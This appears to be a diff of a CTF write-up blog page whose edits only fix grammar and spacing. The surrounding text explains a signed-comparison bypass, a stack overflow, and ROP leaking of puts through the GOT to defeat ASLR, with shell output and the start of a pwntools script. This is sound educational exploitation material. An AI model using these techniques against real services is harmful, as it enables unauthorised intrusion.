@@ -117,7 +117,7 @@
 	</header>
 
 	<article>
-		<p>In this challenge we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool. We are also provided with a <code>tar</code> file that contains the service binary and some <code>.so</code> modules.</p>
+		<p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool. We are also provided with a <code>tar</code> file that contains the service binary and some <code>.so</code> modules.</p>
 
 <p></p>
 
@@ -145,7 +145,7 @@ drwxr-xr-x  8 segflow  staff      256 Jan  3 13:52 ..
 
 <p><code>server</code> is the challenge binary, <code>server.c</code> is its code. <code>libc-2.26.so</code> is the libc library used by the server.</p>
 
-<p>Before understanding the code or the purpose of <code>giftwrapper2.so</code> file, let&rsquo;s try to interact with the service to get an overall understanding what it&rsquo;s doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.</p>
+<p>Before understanding the code or the purpose of <code>giftwrapper2.so</code> file, let&rsquo;s try to interact with the service to get an overall understanding of what it&rsquo;s doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.</p>
 
 <pre><code class="language-shell">$ nc localhost 12345
 *
@@ -154,18 +154,18 @@ drwxr-xr-x  8 segflow  staff      256 Jan  3 13:52 ..
 Welcome to the new gift wrapping service!
 Type &quot;help&quot; for help :)
 &gt; help
-wrap 				(Wrap a gift)
-help 				(Show this information)
-modinfo 			(Show information about the loaded module)
+wrap                 (Wrap a gift)
+help                 (Show this information)
+modinfo             (Show information about the loaded module)
 &gt; 
 </code></pre>
 
 <p>A menu is shown, and we can print the <code>help</code> message, <code>wrap</code> a gift and print some info using the <code>modinfo</code> command.</p>
 
 <pre><code class="language-shell">&gt; help
-wrap 				(Wrap a gift)
-help 				(Show this information)
-modinfo 			(Show information about the loaded module)
+wrap                 (Wrap a gift)
+help                 (Show this information)
+modinfo             (Show information about the loaded module)
 &gt; modinfo
 ************************************
 Information about the loaded module:
@@ -192,7 +192,7 @@ Wow! This looks so beautiful
 
 <p>The <code>modinfo</code> command prints some info about the loaded module and its base address. Probably this is about the <code>giftwrapper2.so</code> found in the challenge files.</p>
 
-<p>The <code>wrap</code> command asks about the size of the gift and the gift text, after that a nice ascii art is shown containing the gift message.</p>
+<p>The <code>wrap</code> command asks about the size of the gift and the gift text after that a nice ascii art is shown containing the gift message.</p>
 
 <p>Since the gift message is printed back to us, I thought it will be a good idea to test if there is a <code>format string</code> vulnerability. Turns out there wasn&rsquo;t.</p>
 
@@ -279,7 +279,7 @@ Sorry! This gift is too large.
 }
 </code></pre>
 
-<p>Mainly it loads the <code>giftwrapper2.so</code> module, calls <code>initialize_module</code> within that module and pass the <code>register_command</code> as its second argument. After that it registers two commands <code>help</code> and <code>modinfo</code>.</p>
+<p>Mainly it loads the <code>giftwrapper2.so</code> module, calls <code>initialize_module</code> within that module and pass the <code>register_command</code> as its second argument. After that, it registers two commands <code>help</code> and <code>modinfo</code>.</p>
 
 <p>So probably the <code>wrap</code> command is registered by the module itself.</p>
 
@@ -322,7 +322,7 @@ Sorry! This gift is too large.
 0x870: jg 0x94c            ; jump to 0x94c if greater
 </code></pre>
 
-<p>The conditional jump is done using the <code>jg</code> instruction which is used for <strong>signed</strong> comparison. Check this nice page to better understand <a href="http://unixwiz.net/techtips/x86-jumps.html">x86-jumps</a>. But the <code>read</code> function interpret its argument as an unsigned integer, which mean if, when prompted for the size, we type <code>-1</code> (<strong>0xffffffff</strong> in hex) we can bypass the check against <strong>0x63</strong>. This is possible because <strong>0xffffffff &lt; 0x63</strong> when they are interpreted as <em>signed</em> numbers.</p>
+<p>The conditional jump is done using the <code>jg</code> instruction which is used for <strong>signed</strong> comparison. Check this nice page to better understand <a href="http://unixwiz.net/techtips/x86-jumps.html">x86-jumps</a>. But the <code>read</code> function interprets its argument as an unsigned integer, which means if, when prompted for the size, we type <code>-1</code> (<strong>0xffffffff</strong> in hex) we can bypass the check against <strong>0x63</strong>. This is possible because <strong>0xffffffff &lt; 0x63</strong> when they are interpreted as <em>signed</em> numbers.</p>
 
 <p>Later when we reach the <code>read</code> function, <strong>0xffffffff</strong> is interpreted as an unsigned number so it&rsquo;s possible to read up to <code>4GB</code> of data.</p>
 
@@ -352,7 +352,7 @@ Wow! This looks so beautiful
 $ 
 </code></pre>
 
-<p>Great instead of printing the prompt again, the connection immediately exit after printing the ascii art, this mean we probably did overwrite the return address stored in the stack, thus crashing the binary.</p>
+<p>Great instead of printing the prompt again, the connection immediately exit after printing the ascii art, this means we probably did overwrite the return address stored in the stack, thus crashing the binary.</p>
 
 <p>Using <code>rabin2</code> from the <a href="http://rada.re/r/">radare2</a> suite, we can get some info from the binary:</p>
 
@@ -398,7 +398,7 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 $ 
 </code></pre>
 
-<p>Now we can either attach the server to a debugger, configure it to follow child process, and wait for it to crash so we can get the value of <code>rip</code> register and calculate the offset, or simply use the <code>dmesg</code> command to print info about the last crashes happened in our system. Since I&rsquo;am lazy, I went for the second approach.</p>
+<p>Now we can either attach the server to a debugger, configure it to follow child process, and wait for it to crash so we can get the value of <code>rip</code> register and calculate the offset, or simply use the <code>dmesg</code> command to print info about the last crashes happened in our system. Since I&rsquo;m lazy, I went for the second approach.</p>
 
 <pre><code class="language-shell">$ nc 0 12345
 *
@@ -429,7 +429,7 @@ $ sudo dmesg | tail
 $ 
 </code></pre>
 
-<p>Great, at the moment of crash, the instruction pointer was pointing to <strong>0x41754141</strong>. Again using <code>ragg2</code> we can calculate the offset.</p>
+<p>Great, at the moment of the crash, the instruction pointer was pointing to <strong>0x41754141</strong>. Again using <code>ragg2</code> we can calculate the offset.</p>
 
 <pre><code class="language-shell">$ ragg2 -q 0x41754141
 Little endian: 136
@@ -442,7 +442,7 @@ $
 <p>At this step we know that we control the instruction pointer, we also know that the stack is not executable. One way to exploit this is to <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return to libc</a>, but since we don&rsquo;t know at what address <code>libc</code> is mapped in the virtual memory, we need to leak some addresses.</p>
 
 <p>Using <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> we can read data from anywhere, this is done because the function <code>puts</code> actually prints bytes from the address pointed by the <code>rdi</code> register. So by chaining
-<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address we need to read the address of any symbol from it. Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good candidate is puts&rsquo; entry in <code>GOT</code>, to get its address we can use <code>objdump -R</code>:</p>
+<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address, we need to read the address of any symbol from it. Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good candidate is <code>puts</code> entry in <code>GOT</code>, to get its address we can use <code>objdump -R</code>:</p>
 
 <pre><code class="language-shell">$ objdump -R server
 server:     file format elf64-x86-64
@@ -464,7 +464,7 @@ $
 [0x00400dc0]&gt; 
 </code></pre>
 
-<p>The following python code connect to server, interact with it and then send our rop chain. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this, since it makes network programming much more easy and funny.</p>
+<p>The following python code connects to the server, interact with it and then send our rop chain. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this since it makes network programming much more easy and funny.</p>
 
 <pre><code class="language-python">from pwn import *
 
@@ -519,7 +519,7 @@ puts is at 0x7feba007c460
 
 <br/></p>
 
-<p>Here it shows that puts&rsquo; offset within libc is <strong>0x78460</strong>, given this we can calculate libc base address.</p>
+<p>Here it shows that puts&rsquo; offset within libc is <strong>0x78460</strong>, given this, we can calculate libc base address.</p>
 
 <blockquote>
 <p>libc_base = puts absolute address - puts relative offset</p>
